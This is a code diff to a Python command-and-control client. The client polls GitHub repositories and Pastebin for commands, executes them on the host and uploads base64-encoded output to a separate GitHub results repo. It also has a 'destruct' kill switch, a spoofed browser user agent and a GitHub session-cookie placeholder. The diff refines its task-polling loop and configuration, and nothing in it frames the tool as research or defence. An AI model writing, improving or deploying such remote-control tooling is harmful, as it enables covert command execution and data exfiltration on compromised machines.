@@ -10,12 +10,13 @@ import base64
 
 PASTE_BIN = 'https://pastebin.com/raw/gQBy3rEY'
 
-C2_GITHUB_REPO = "https://github.com/gokupwn/Windows-Security"
-C2_RESULT_REPO = "https://github.com/gokupwn/netdeath"
+C2_GITHUB_REPO = "https://github.com/gokupwn/c2_github_repo"
+C2_RESULT_REPO = "https://github.com/gokupwn/c2_result_repo"
 C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
 C2_CLIENT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
 PROXY_HOST = '127.0.0.1'
 PROXY_PORT = 8080
+FIRST_TASK_ID = 15111010 ### TAKE IT FROM THE server.ini File and the value of first_command
 
 def fetchRepoHtml(host, path):
 
@@ -60,7 +61,6 @@ def getGithubRepoID(repo_url):
     if repo_json_data:
         repo_json_data = json.loads(html.unescape(repo_json_data))
         repo_id = repo_json_data['payload']['repository_id']
-        print("[+] Repo ID Found: ", repo_id)
         return repo_id
     else:
         # Add error handling
@@ -303,13 +303,16 @@ def usePasteBin():
     tasks_ids = getTasksIds()
 
     for task_id in tasks_ids:
-        url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/test-hassoun.zip"}
+        url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/task.zip"}
         status_code, command = getCommandFromGithubC2(url)
         
         # Kill Yourself
         if command == 'destruct':
             exit(1)
         
+        elif command == 'Starting CMD':
+            continue
+
         else:
             # We have a valid command
             print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
@@ -325,24 +328,32 @@ def useGithub():
 
     repo_id_result = getGithubRepoID(C2_RESULT_REPO)
     repo_id_c2server = getGithubRepoID(C2_GITHUB_REPO)
-    task_id = 15100353 # manual for now
+    task_id = FIRST_TASK_ID # manual for now
+    print(f"[+] C2 Command Repo ID Found: {repo_id_c2server}")
+    print(f"[+] C2 Result Repo ID Found: {repo_id_result}")
+    print(f"[+] First Command Task: {FIRST_TASK_ID}")
 
     while True:
+        # Expect what is the last task id (Last Command)
         print("[*] Expecting the next task id")
         expected_task_id = uploadResultToC2('starting', repo_id_c2server)
-        while task_id < expected_task_id - 1:
-            task_id += 1
 
-            url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/test-hassoun.zip"}
+        while task_id < expected_task_id:
+            url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/task.zip"}
             status_code, command = getCommandFromGithubC2(url)
 
             # Not my task_id
             if status_code == 404:
+                task_id += 1
                 continue
 
             # Kill Yourself
             elif command == 'destruct':
                 exit(1)
+
+            elif command == 'Starting CMD':
+                task_id += 1
+                continue
             
             else:
                 # We have a valid command
@@ -351,8 +362,10 @@ def useGithub():
                 print(f"[*] Execute The Command: {command}")
                 uploadResultToC2(base64.b64encode(str.encode(command_result.stdout)).decode('utf-8'), repo_id_result)
                 print(f"[+=>] Result Of The Command Uploaded")
-            task_id = expected_task_id
-        sleep(60)        
+            task_id += 1
+        
+        task_id = expected_task_id
+        sleep(30)        
 
 if __name__ == '__main__':
     useGithub()
